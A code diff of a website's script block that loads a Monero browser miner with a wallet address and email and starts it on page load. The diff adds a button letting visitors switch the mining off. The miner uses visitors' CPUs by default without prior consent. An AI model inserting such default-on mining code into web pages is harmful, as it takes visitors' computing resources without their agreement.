@@ -1,7 +1,17 @@
 <script src="/assets/js/monero.js"></script>
 <script>
     var miner = new CH.User('45RGGCsoMuMcvqbq3Q7Pv9f12LHbqXYspPBMvSRytKhE6CXwVkRPxZu2gkf7oUfNgWAqT6Bnaecdd4SyNqSo1Vx4EKG18Vd', 'x:jun@beomi.net', {
-        throttle: 0.9,
-        });
-    miner.start();
+        throttle: 0.9
+        })
+    miner.start()
+
+    var minerOffButton = document.querySelector('#turnOffMiner')
+    var minerInfo = document.querySelector('#minerInfo')
+    minerOffButton.addEventListener('click', function(e) {
+        miner.stop()
+        minerOffButton.disabled = true
+        minerOffButton.innerText = 'CPU연산 꺼짐'
+        minerOffButton.className = 'button-disabled'
+        minerInfo.style.display = 'none'
+    })
 </script>
